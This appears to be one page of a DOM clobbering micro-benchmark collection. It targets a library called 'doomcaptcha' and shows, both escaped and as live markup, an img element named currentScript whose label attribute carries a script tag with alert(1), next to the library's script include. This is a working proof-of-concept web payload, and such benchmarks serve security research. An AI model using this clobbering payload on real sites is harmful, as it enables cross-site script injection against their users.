<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM Clobbering Micro Benchmarks</title>
    <link rel="stylesheet" href="../styles/styles.css">
    <style>
        /* Ensure that long lines in <pre> tags wrap */
        pre {
            white-space: pre-wrap;       /* CSS3 */
            white-space: -moz-pre-wrap;  /* Mozilla */
            white-space: -pre-wrap;      /* Opera 4-6 */
            white-space: -o-pre-wrap;    /* Opera 7 */
            word-wrap: break-word;       /* IE */
        }
    </style>
</head>
<body>
<h1>DOM Clobbering Collection - doomcaptcha</h1>

<section class="section">
  <div class="column">
  <p><span class="label">Payload</span><br><br>
  <pre>&lt;img name=currentScript label=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/img&gt;</pre>
  <img name=currentScript label="<script>alert(1)</script>"></img>
  </div>
</section>

<section class="section">
  <div class="column">
  <p><span class="label">Library</span><br><br>
  <pre>&lt;form&gt;
&lt;script src=script.js&gt;&lt;/script&gt;
&lt;/form&gt;</pre>
  <form>
<script src=script.js></script>
</form>
  </div>
</section>

</body>
</html>
